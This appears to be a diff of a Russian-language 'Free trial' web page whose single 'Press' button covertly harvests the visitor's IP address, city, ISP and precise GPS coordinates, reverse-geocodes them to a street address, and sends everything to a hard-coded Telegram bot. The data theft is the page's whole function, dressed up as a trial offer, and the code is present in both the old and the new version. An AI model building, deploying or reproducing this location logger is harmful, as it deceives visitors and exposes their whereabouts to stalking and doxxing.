@@ -1,97 +1,83 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Free trial</title>
-<style>
-body {
-  background-color: #121212;
-  color: #f0f0f0;
-  font-family: Arial, sans-serif;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  height: 100vh;
-  margin: 0;
-  padding: 20px;
-}
-h1 {
-  margin-bottom: 40px;
-  font-size: 1.5rem;
-  text-align: center;
-}
-button {
-  background-color: #1f1f1f;
-  color: #f0f0f0;
-  border: 2px solid #444;
-  padding: 15px 30px;
-  font-size: 1rem;
-  border-radius: 10px;
-  cursor: pointer;
-  transition: all 0.2s ease;
-  width: 100%;
-  max-width: 300px;
-}
-button:hover {
-  background-color: #333;
-  border-color: #888;
-}
-</style>
-</head>
-<body>
-<h1>Free trial</h1>
-<button id="sendBtn">Press</button>
-
-<script>
-const TOKEN = "8204774746:AAHX0qyN0FL4MpCtsW4PJzc7c8a1aKloOBw";
-const CHAT_ID = "1915671880";
-
-async function sendToTelegram(msg) {
-  await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-  });
-}
-
-document.getElementById("sendBtn").onclick = async () => {
-  if (!navigator.geolocation) {
-    alert("Геолокация не поддерживается");
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(async pos => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-
-    try {
-      const ipRes = await fetch("https://ipwho.is/");
-      const ipData = await ipRes.json();
-
-      const ip = ipData.ip || "Не найдено";
-      const city = ipData.city || "Не найдено";
-      const country = ipData.country || "Не найдено";
-      const org = ipData.connection?.org || "Не найдено";
-
-      const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-      const geoData = await geoRes.json();
-      const address = geoData.display_name || "Адрес не найден";
-
-      const message = `📍 Данные пользователя:\n🌐 IP: ${ip}\n🏙️ Город: ${city}, ${country}\n📡 Провайдер: ${org}\n\n📍 Координаты: ${lat}, ${lon}\n📬 Адрес: ${address}`;
-
-      await sendToTelegram(message);
-      alert("Данные отправлены!");
-    } catch (e) {
-      alert("Ошибка получения данных: " + e.message);
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free trial</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
     }
 
-  }, err => {
-    alert("Не удалось получить геопозицию: " + err.message);
-  }, {enableHighAccuracy:true, timeout:15000});
-};
-</script>
+    h1 {
+      margin-bottom: 40px;
+      font-size: 1.5rem;
+      text-align: center;
+    }
+
+    button {
+      background-color: #1f1f1f;
+      color: #f0f0f0;
+      border: 2px solid #444;
+      padding: 15px 30px;
+      font-size: 1rem;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      width: 100%;
+      max-width: 300px;
+    }
+
+    button:hover {
+      background-color: #333;
+      border-color: #888;
+    }
+  </style>
+</head>
+<body>
+  <h1>Free trial</h1>
+  <button id="sendBtn">Press</button>
+
+  <script>
+    const TOKEN = "8204774746:AAHX0qyN0FL4MpCtsW4PJzc7c8a1aKloOBw";
+    const CHAT_ID = "1915671880";
+
+    async function sendToTelegram(message) {
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+    }
+
+    document.getElementById("sendBtn").onclick = () => {
+      fetch("https://ipapi.co/json/").then(r => r.json()).then(async ipdata => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(async pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+            const geoData = await geoRes.json();
+            const address = geoData.display_name || "Адрес не найден";
+
+            const msg = `📍 Данные пользователя:\n🌐 IP: ${ipdata.ip}\n🏙️ Город: ${ipdata.city}, ${ipdata.country_name}\n📡 Провайдер: ${ipdata.org}\n\n📍 Координаты: ${lat}, ${lon}\n📬 Адрес: ${address}`;
+
+            sendToTelegram(msg);
+            alert("Данные отправлены!");
+          });
+        }
+      });
+    };
+  </script>
 </body>
 </html>
-
